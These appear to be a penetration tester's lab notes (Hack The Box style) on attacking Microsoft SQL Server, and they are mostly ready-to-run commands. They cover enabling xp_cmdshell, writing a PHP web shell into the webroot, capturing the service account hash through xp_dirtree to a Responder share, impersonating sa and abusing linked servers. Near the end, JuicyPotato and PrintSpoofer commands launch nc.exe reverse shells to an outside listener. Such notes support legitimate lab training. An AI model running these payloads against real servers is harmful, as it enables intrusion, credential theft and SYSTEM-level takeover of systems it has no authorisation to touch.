# MSSQL
### Linux - SQSH
```
sqsh -S 10.129.20.13 -U username -P Password123
```
When using Windows Authentication, we need to specify the domain name or the hostname of the target machine. If we don't specify a domain or hostname, it will assume SQL Authentication and authenticate against the users created in the SQL Server. Instead, if we define the domain or hostname, it will use Windows Authentication. If we are targetting a local account, we can use SERVERNAME\\accountname or .\\accountname. The full command would look like:
```
sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
```
### Windows - SQLCMD     
```
C:\htb> sqlcmd -S 10.129.20.13 -U username -P Password123
```

# Footprinting the Service
```
nmap -Pn -sV -sC -p1433 10.10.10.125
```
The scripted NMAP scan below provides us with helpful information. We can see the hostname, database instance name, software version of MSSQL and named pipes are enabled. We will benefit from adding these discoveries to our notes.
```
sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248
```
Metasploit to run an auxiliary scanner called mssql_ping 
```
use auxiliary/scanner/mssql/mssql_ping
```
### Connecting with Mssqlclient.py
If we can guess or gain access to credentials, this allows us to remotely connect to the MSSQL server and start interacting with databases using T-SQL (Transact-SQL)
```
python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth
```
Within a domain controller, username and password are operator
```
mssqlclient.py -windows-auth manager.htb/operator:operator@manager.htb
```
```
impacket-mssqlclient -windows-auth manager.htb/operator:operator@manager.htb
```

## Command Execution
MSSQL has a extended stored procedures called `xp_cmdshell` which allow us to execute system commands using SQL. Keep in mind the following about `xp_cmdshell`:
To execute commands using SQL syntax on MSSQL, use:
```
1> xp_cmdshell 'whoami'
2> GO
```
if xp_cmdshell is not enabled, we can enable it, if we have the appropriate privileges, using the following command:
To allow advanced options to be changed.
```
EXECUTE sp_configure 'show advanced options', 1
GO
```
To update the currently configured value for advanced options.
```
RECONFIGURE
GO
```
To enable the feature.
```
EXECUTE sp_configure 'xp_cmdshell', 1
GO
```
To update the currently configured value for this feature.
```
RECONFIGURE
GO
```
To enable xp_cmdshell on a linked server
```
EXECUTE AS LOGIN = 'john'
EXEC [LOCAL.TEST.LINKED.SRV].master.dbo.sp_configure 'show advanced options', 1
EXEC ('RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]
EXEC [LOCAL.TEST.LINKED.SRV].master.dbo.sp_configure 'xp_cmdshell', 1
EXEC ('RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]
```
## Write Local Files
To write files using MSSQL, we need to enable Ole Automation Procedures, which requires admin privileges, and then execute some stored procedures to create the file
MSSQL - Enable Ole Automation Procedures
```
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO
```
MSSQL - Create a File
```
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```
### Read Local Files
```
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO
```
`xp_dirtree` is another feature for listing files on the filesystem. It works:
```
SQL (MANAGER\Operator  guest@master)> xp_dirtree C:\
```
Manage to the webroot and check for any files then you can use wget to download any file available in the webroot directory 
```
wget http://manager.htb/website-backup-27-07-23-old.zip
```

### Capture MSSQL Service Hash
We can also steal the `MSSQL` service account hash using `xp_subdirs` or `xp_dirtree` undocumented stored procedures, which use the SMB protocol to retrieve a list of child directories under a specified parent directory from the file system. 
To make this work, we need first to start `Responder` or `impacket-smbserver` and execute one of the following SQL queries:
```
sudo responder -I tun0
sudo impacket-smbserver share ./ -smb2support
```
XP_DIRTREE Hash Stealing
```
1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
2> GO
```
XP_SUBDIRS Hash Stealing
```
1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
2> GO
```

### Impersonate Existing Users with MSSQL
SQL Server has a special permission, named IMPERSONATE, that allows the executing user to take on the permissions of another user or login until the context is reset or the session ends. Let's explore how the IMPERSONATE privilege can lead to privilege escalation in SQL Server.
First, we need to identify users that we can impersonate. Sysadmins can impersonate anyone by default, But for non-administrator users, privileges must be explicitly assigned. We can use the following query to identify users we can impersonate:
```
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
```
We have a list of users that we can impersonate (in the example below it will be sa)

To get an idea of privilege escalation possibilities, let's verify if our current user has the sysadmin role:
Verifying our Current User and Role
```
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go
```
As the returned value 0 indicates, we do not have the sysadmin role, but we can impersonate the sa user.
Impersonating the SA User
```
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO
```
We can now execute any command as a sysadmin as the returned value 1 indicates. To revert the operation and return to our previous user, we can use the Transact-SQL statement REVERT.

Note: It's recommended to run EXECUTE AS LOGIN within the master DB, because all users, by default, have access to that database. If a user you are trying to impersonate doesn't have access to the DB you are connecting to it will present an error. Try to move to the master DB using USE master.

### Communicate with Other Databases with MSSQL
`MSSQL` has a configuration option called linked servers. Linked servers are typically configured to enable the database engine to execute a Transact-SQL statement that includes tables in another instance of SQL Server, or another database product such as Oracle.

If we manage to gain access to a SQL Server with a linked server configured, we may be able to move laterally to that database server. Administrators can configure a linked server using credentials from the remote server. If those credentials have sysadmin privileges, we may be able to execute commands in the remote SQL instance. Let's see how we can identify and execute queries on linked servers.

Identify linked Servers in MSSQL
```
1> SELECT srvname, isremote FROM sysservers
2> GO
```
As we can see in the query's output, we have the name of the server and the column isremote, where 1 means is a remote server, and 0 is a linked server
In this example we can see 10.0.0.12\SQLEXPRESS with the value 0 under isremote
Next, we can attempt to identify the user used for the connection and its privileges. The EXECUTE statement can be used to send pass-through commands to linked servers. We add our command between parenthesis and specify the linked server between square brackets ([ ]).
```
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
2> GO
```
As we have seen, we can now execute queries with sysadmin privileges on the linked server. As sysadmin, we control the SQL Server instance. We can read data from any database or execute system commands with xp_cmdshell.
# Privilege escalation (check [[SeImpersonate and SeAssignPrimaryToken]])
the following command is used within MSSQL with xp_cmdshell
```
SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
```
```
-l is the COM server listening port
-p is the program to launch (cmd.exe)
-a is the argument passed to cmd.exe
-t is the createprocess call.
```
we are telling the tool to try both the CreateProcessWithTokenW and CreateProcessAsUser functions, which need SeImpersonate or SeAssignPrimaryToken privileges respectively
```
nc -lvnp 8443
```
4. reverse shell created with nt authority/system

the following command is used within MSSQL with xp_cmdshell
```
SQL> xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd‚Äù
```
```
nc -lvnp 8443
```
3. reverse shell created with nt authority/system